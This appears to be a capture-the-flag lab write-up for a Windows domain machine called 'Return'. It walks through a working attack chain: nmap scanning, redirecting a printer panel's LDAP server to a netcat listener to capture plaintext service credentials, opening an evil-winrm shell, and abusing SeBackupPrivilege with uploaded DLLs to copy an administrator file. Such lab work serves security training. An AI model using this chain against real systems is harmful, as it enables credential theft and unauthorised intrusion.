# Return

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nmap -sC -T4 return.htb 
Starting Nmap 7.95 ( <https://nmap.org> ) at 2025-10-17 10:30 EDT
Nmap scan report for return.htb (10.10.11.108)
Host is up (0.23s latency).
Not shown: 987 closed tcp ports (reset)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
|_http-title: HTB Printer Admin Panel
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  wsman

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 18m35s
| smb2-time: 
|   date: 2025-10-17T14:49:09
|_  start_date: N/A
```

We find a printer settings page available for us, but we can’t see the password.

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FFKNUlYETz7hnYkKLDSMi%2Fimage.png?alt=media&#x26;token=4d527c53-9659-4b63-ba27-ac7fdee5d99b" alt=""><figcaption></figcaption></figure>

We can modify the server address to point to our machine and see if we can get a connection back

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2F4EURns5WFR8UjEOxQ3NI%2Fimage.png?alt=media&#x26;token=c91942b1-5e95-4734-b061-9027a2cc3247" alt=""><figcaption></figcaption></figure>

It seems like we get the clear text password

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nc -lnvp 389      
listening on [any] 389 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.108] 62387
0*`%return\\svc-printer�
                       1edFg43012!!
```

We know from the settings panel that the user is svc-printer, so we try to authenticate

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb return.htb -u 'svc-printer' -p '1edFg43012!!'         
SMB         10.10.11.108    445    PRINTER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False) 
SMB         10.10.11.108    445    PRINTER          [+] return.local\\svc-printer:1edFg43012!!
```

The credentials work ⇒ svc-printer:1edFg43012!!

Enumerating the shares

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb return.htb -u 'svc-printer' -p '1edFg43012!!' --shares
SMB         10.10.11.108    445    PRINTER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False) 
SMB         10.10.11.108    445    PRINTER          [+] return.local\\svc-printer:1edFg43012!! 
SMB         10.10.11.108    445    PRINTER          [*] Enumerated shares
SMB         10.10.11.108    445    PRINTER          Share           Permissions     Remark
SMB         10.10.11.108    445    PRINTER          -----           -----------     ------
SMB         10.10.11.108    445    PRINTER          ADMIN$          READ            Remote Admin
SMB         10.10.11.108    445    PRINTER          C$              READ,WRITE      Default share
SMB         10.10.11.108    445    PRINTER          IPC$            READ            Remote IPC
SMB         10.10.11.108    445    PRINTER          NETLOGON        READ            Logon server share 
SMB         10.10.11.108    445    PRINTER          SYSVOL          READ            Logon server share 
```

We can use evil-winrm to get a shell on the machine

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ evil-winrm -i return.htb -u svc-printer -p '1edFg43012!!'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: <https://github.com/Hackplayers/evil-winrm#Remote-path-completion>
                                        
Info: Establishing connection to remote endpoint
```

We check our user privs

```bash
*Evil-WinRM* PS C:\\Users\\svc-printer> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeLoadDriverPrivilege         Load and unload device drivers      Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled
```

We can abuse many of them, but here we will use SeBackupPrivilge

First we upload some dll to the machine

```bash
*Evil-WinRM* PS C:\\Users\\svc-printer\\Documents> upload SeBackupPrivilegeCmdLets.dll
                                        
Info: Uploading /home/kali/Downloads/SeBackupPrivilegeCmdLets.dll to C:\\Users\\svc-printer\\Documents\\SeBackupPrivilegeCmdLets.dll
                                        
Data: 16384 bytes of 16384 bytes copied

*Evil-WinRM* PS C:\\Users\\svc-printer\\Documents> upload SeBackupPrivilegeUtils.dll
                                        
Info: Uploading /home/kali/Downloads/SeBackupPrivilegeUtils.dll to C:\\Users\\svc-printer\\Documents\\SeBackupPrivilegeUtils.dll
                                        
Data: 21844 bytes of 21844 bytes copied
```

Then we import them

```bash
*Evil-WinRM* PS C:\\Users\\svc-printer\\Documents> Import-Module .\\SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\\Users\\svc-printer\\Documents> Import-Module .\\SeBackupPrivilegeUtils.dll
```

Next, we can copy the root flag to our user Desktop

```bash
*Evil-WinRM* PS C:\\Users\\svc-printer\\Documents> Copy-FileSeBackupPrivilege 'C:\\Users\\Administrator\\Desktop\\root.txt' .\\root.txt
*Evil-WinRM* PS C:\\Users\\svc-printer\\Documents> ls 

    Directory: C:\\Users\\svc-printer\\Documents

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/17/2025   8:12 AM             34 root.txt
-a----       10/17/2025   8:10 AM          12288 SeBackupPrivilegeCmdLets.dll
-a----       10/17/2025   8:10 AM          16384 SeBackupPrivilegeUtils.dll
```
